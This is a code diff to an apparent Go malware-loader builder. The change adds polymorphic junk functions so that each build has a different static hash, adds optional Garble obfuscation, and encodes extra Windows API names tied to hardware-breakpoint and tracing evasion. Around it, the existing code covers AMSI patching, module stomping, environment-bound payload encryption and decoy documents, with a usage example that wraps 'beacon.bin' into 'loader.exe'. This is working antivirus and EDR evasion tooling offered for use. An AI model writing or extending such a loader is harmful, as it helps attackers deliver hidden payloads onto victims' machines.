@@ -120,12 +120,21 @@ type TemplateData struct {
 	EnvBindHash     string   // 环境特征 SHA-256 哈希（base64，用于运行时校验）
 	// v2.0: 内存权限混淆
 	EnableMemObf bool // 是否启用 RW→NoAccess→RX 三步权限翻转
+	// v2.1: 多态代码生成
+	JunkFuncs []JunkFunc // 编译时注入的垃圾函数（改变静态哈希）
+	JunkCalls []string   // 在 main 中插入的垃圾函数调用
 }
 
 // EvasionSnippet 表示一个已解析的 evasion 技术代码片段
 type EvasionSnippet struct {
 	FuncName string // 函数名，如 "evasionT001"
 	Code     string // 完整的 Go 函数代码（ENC: 占位符已替换）
+}
+
+// JunkFunc 表示一个编译时注入的垃圾函数，用于改变每次构建的静态哈希
+type JunkFunc struct {
+	Name string // 函数名
+	Body string // 函数体
 }
 
 type encryptedAssets struct {
@@ -179,6 +188,7 @@ type Config struct {
 	StompDLL        string // v2.0: Module Stomping 牺牲 DLL 名称（空=不启用）
 	EnvBind         string // v2.0: 环境绑定 key=value 对（逗号分隔）
 	MemObf          bool   // v2.0: 内存权限混淆（RW→NoAccess→RX）
+	Garble          bool   // v2.1: 启用 Garble 编译期混淆（控制流+符号+字符串）
 
 	// ── 向后兼容的旧 bool flag（内部映射到 InjectMode）──
 	legacyInject    bool
@@ -209,6 +219,7 @@ func registerFlags(cfg *Config) {
 	flag.StringVar(&cfg.StompDLL, "stomp-dll", "", "Optional: DLL name for Module Stomping (e.g., winhttp.dll). Empty=disabled.")
 	flag.StringVar(&cfg.EnvBind, "env-bind", "", "Optional: Environment-bound encryption. Comma-separated key=value pairs (e.g., hostname=DC01,domain=CORP.LOCAL).")
 	flag.BoolVar(&cfg.MemObf, "mem-obf", false, "Optional: Enable memory permission obfuscation (RW→NoAccess→RX three-step flip).")
+	flag.BoolVar(&cfg.Garble, "garble", false, "Optional: Enable Garble obfuscation (control flow, symbol renaming, string encryption).")
 
 	// 向后兼容：旧的 -inject / -earlybird bool flag 仍可使用
 	flag.BoolVar(&cfg.legacyInject, "inject", false, "Deprecated: use -inject-mode=inject instead.")
@@ -256,7 +267,7 @@ func (c *Config) Validate() []string {
 	if len(c.EvasionTechs) > 0 {
 		_, invalid := knowledge.ByIDs(c.EvasionTechs)
 		for _, id := range invalid {
-			errs = append(errs, fmt.Sprintf("[-] Unknown evasion technique ID '%s': available T001-T005", id))
+			errs = append(errs, fmt.Sprintf("[-] Unknown evasion technique ID '%s': available T001-T007", id))
 		}
 	}
 
@@ -318,6 +329,9 @@ func (c *Config) Features() []string {
 	if c.MemObf {
 		features = append(features, "Memory Permission Obfuscation")
 	}
+	if c.Garble {
+		features = append(features, "Garble Compile-Time Obfuscation")
+	}
 	if c.Delay > 0 {
 		features = append(features, fmt.Sprintf("Delay %ds", c.Delay))
 	}
@@ -365,6 +379,94 @@ func selectAMSIPatch(random io.Reader) string {
 	_, _ = io.ReadFull(random, b)
 	idx := int(b[0]) % len(patches)
 	return base64.StdEncoding.EncodeToString(patches[idx])
+}
+
+// generateRandomName 生成随机的合法 Go 标识符
+func generateRandomName(random io.Reader, prefix string) string {
+	b := make([]byte, 6)
+	_, _ = io.ReadFull(random, b)
+	chars := "abcdefghijklmnopqrstuvwxyz"
+	name := prefix
+	for _, v := range b {
+		name += string(chars[int(v)%len(chars)])
+	}
+	return name
+}
+
+// generateJunkFuncs 生成多态垃圾函数，每次构建产生不同的静态特征
+// 这些函数执行无害的计算操作，编译器不会优化掉（因为有副作用）
+func generateJunkFuncs(random io.Reader, count int) ([]JunkFunc, []string) {
+	templates := []string{
+		`func %s() {
+	v := time.Now().UnixNano()
+	for i := 0; i < %d; i++ {
+		v ^= v << %d
+		v ^= v >> %d
+		v ^= v << %d
+	}
+	if v == 0 { time.Sleep(time.Nanosecond) }
+}`,
+		`func %s() {
+	buf := make([]byte, %d)
+	for i := range buf {
+		buf[i] = byte(i*%d + %d)
+	}
+	h := uint32(0x%08x)
+	for _, b := range buf {
+		h = h*%d + uint32(b)
+	}
+	if h == 0 { runtime.Gosched() }
+}`,
+		`func %s() {
+	s := "%s"
+	r := make([]byte, len(s))
+	for i := 0; i < len(s); i++ {
+		r[i] = s[i] ^ byte(%d)
+	}
+	if len(r) == 0 { runtime.GC() }
+}`,
+	}
+
+	var funcs []JunkFunc
+	var calls []string
+	b := make([]byte, 16)
+
+	for i := 0; i < count; i++ {
+		_, _ = io.ReadFull(random, b)
+		name := generateRandomName(random, "init")
+		tmplIdx := int(b[0]) % len(templates)
+
+		var body string
+		switch tmplIdx {
+		case 0:
+			iters := 2 + int(b[1])%8
+			s1 := 1 + int(b[2])%15
+			s2 := 1 + int(b[3])%15
+			s3 := 1 + int(b[4])%15
+			body = fmt.Sprintf(templates[0], name, iters, s1, s2, s3)
+		case 1:
+			bufSize := 8 + int(b[1])%56
+			mul := 1 + int(b[2])%200
+			add := int(b[3])
+			seed := uint32(b[4])<<24 | uint32(b[5])<<16 | uint32(b[6])<<8 | uint32(b[7])
+			prime := []uint32{31, 37, 41, 43, 47, 53, 59, 61}[int(b[8])%8]
+			body = fmt.Sprintf(templates[1], name, bufSize, mul, add, seed, prime)
+		case 2:
+			// 生成随机字符串内容
+			strLen := 8 + int(b[1])%24
+			strBytes := make([]byte, strLen)
+			_, _ = io.ReadFull(random, strBytes)
+			for j := range strBytes {
+				strBytes[j] = 'a' + strBytes[j]%26
+			}
+			xorVal := 1 + int(b[2])%254
+			body = fmt.Sprintf(templates[2], name, string(strBytes), xorVal)
+		}
+
+		funcs = append(funcs, JunkFunc{Name: name, Body: body})
+		calls = append(calls, name+"()")
+	}
+	return funcs, calls
 }
 
 // buildEncodedStrings 预编码所有敏感字符串
@@ -440,6 +542,10 @@ func buildEncodedStrings(key byte, extraAPIs []string) map[string]string {
 		"GetCurrentThreadId",
 		"VirtualFree",
 		"LoadLibraryA",
+		"AddVectoredExceptionHandler",
+		"GetThreadContext",
+		"SetThreadContext",
+		"NtTraceControl",
 	}
 	// 合并 evasion 技术引入的额外 API（去重）
 	if len(extraAPIs) > 0 {
@@ -645,6 +751,13 @@ func buildTemplateData(ctx BuildContext, cfg Config, assets encryptedAssets) Tem
 		})
 	}
 
+	// 多态：生成 3-7 个垃圾函数，改变每次构建的静态哈希
+	junkCountByte := make([]byte, 1)
+	_, _ = io.ReadFull(random, junkCountByte)
+	junkCount := 3 + int(junkCountByte[0])%5
+	junkFuncs, junkCalls := generateJunkFuncs(random, junkCount)
+	log.Printf("[+] Polymorphic: injected %d junk functions", junkCount)
+
 	return TemplateData{
 		EncryptedPayload:      assets.Payload,
 		EncryptedDecoy:        assets.Decoy,
@@ -666,6 +779,8 @@ func buildTemplateData(ctx BuildContext, cfg Config, assets encryptedAssets) Tem
 		EnvBindFeatures:       assets.EnvBindFeatures,
 		EnvBindHash:           assets.EnvBindHash,
 		EnableMemObf:          cfg.MemObf,
+		JunkFuncs:             junkFuncs,
+		JunkCalls:             junkCalls,
 	}
 }
 
@@ -693,7 +808,17 @@ func normalizeOutputPath(output string) (string, error) {
 	return absOutputFile, nil
 }
 
-func buildWindowsBinary(source []byte, output string) error {
+func deriveGarbleSeed(salt string) string {
+	h := sha256.Sum256([]byte("garble-seed:" + salt))
+	return base64.RawURLEncoding.EncodeToString(h[:16])
+}
+
+// buildWindowsBinary 交叉编译生成的 loader 源码为 windows/amd64 可执行文件。
+// garbleSeed 控制 garble 行为：
+//   - "": 不使用 garble
+//   - "random": garble -seed=random（非确定性）
+//   - 其他值: garble -seed=<value>（确定性）
+func buildWindowsBinary(source []byte, output string, garbleSeed string) error {
 	tmpDir, err := os.MkdirTemp("", "gophantom-build-*")
 	if err != nil {
 		return fmt.Errorf("failed to create temp directory: %w", err)
@@ -710,7 +835,17 @@ func buildWindowsBinary(source []byte, output string) error {
 		return fmt.Errorf("failed to create temp go.sum: %w", err)
 	}
 
-	cmd := exec.Command("go", "build", "-mod=mod", "-o", output, "-ldflags", "-s -w -H windowsgui", "loader.go")
+	var cmd *exec.Cmd
+	if garbleSeed != "" {
+		garblePath, err := exec.LookPath("garble")
+		if err != nil {
+			return fmt.Errorf("garble not found in PATH: %w (install: go install mvdan.cc/garble@latest)", err)
+		}
+		cmd = exec.Command(garblePath, "-literals", "-tiny", "-seed="+garbleSeed,
+			"build", "-mod=mod", "-o", output, "-ldflags", "-s -w -H windowsgui", "loader.go")
+	} else {
+		cmd = exec.Command("go", "build", "-mod=mod", "-o", output, "-ldflags", "-s -w -H windowsgui", "loader.go")
+	}
 	cmd.Dir = tmpDir
 	cmd.Env = append(os.Environ(), "CGO_ENABLED=0", "GOOS=windows", "GOARCH=amd64")
 
@@ -753,7 +888,21 @@ func run(ctx BuildContext, cfg Config) (string, error) {
 	}
 
 	log.Printf("[+] Building x64 version...")
-	if err := buildWindowsBinary(sourceCode, absOutputFile); err != nil {
+	// 确定 garble seed：
+	//   - 不使用 garble → ""
+	//   - GOPHANTOM_SALT 已设置 → 从 salt 派生确定性 seed
+	//   - 否则 → "random"
+	var garbleSeed string
+	if cfg.Garble {
+		if saltEnv := os.Getenv("GOPHANTOM_SALT"); saltEnv != "" {
+			garbleSeed = deriveGarbleSeed(saltEnv)
+			log.Printf("[+] Garble: deterministic seed derived from GOPHANTOM_SALT")
+		} else {
+			garbleSeed = "random"
+			log.Printf("[+] Garble: using random seed (non-reproducible)")
+		}
+	}
+	if err := buildWindowsBinary(sourceCode, absOutputFile, garbleSeed); err != nil {
 		return "", err
 	}
 	return absOutputFile, nil
@@ -786,6 +935,7 @@ func main() {
 		fmt.Fprintf(os.Stderr, "  -stomp-dll string\n        DLL name for Module Stomping (e.g., winhttp.dll, amstream.dll)\n")
 		fmt.Fprintf(os.Stderr, "  -env-bind string\n        Env-bound encryption: key=value pairs (e.g., hostname=DC01,domain=CORP.LOCAL)\n")
 		fmt.Fprintf(os.Stderr, "  -evasion-techs string\n        Comma-separated technique IDs (e.g., T001,T003,T005)\n")
+		fmt.Fprintf(os.Stderr, "  -garble\n        Enable Garble obfuscation (control flow, symbol renaming, string encryption)\n")
 		fmt.Fprintf(os.Stderr, "  -h, --help\n        Show this help message\n\n")
 		fmt.Fprintf(os.Stderr, "Example:\n")
 		fmt.Fprintf(os.Stderr, "  %s -decoy document.pdf -payload beacon.bin -out loader.exe\n", os.Args[0])
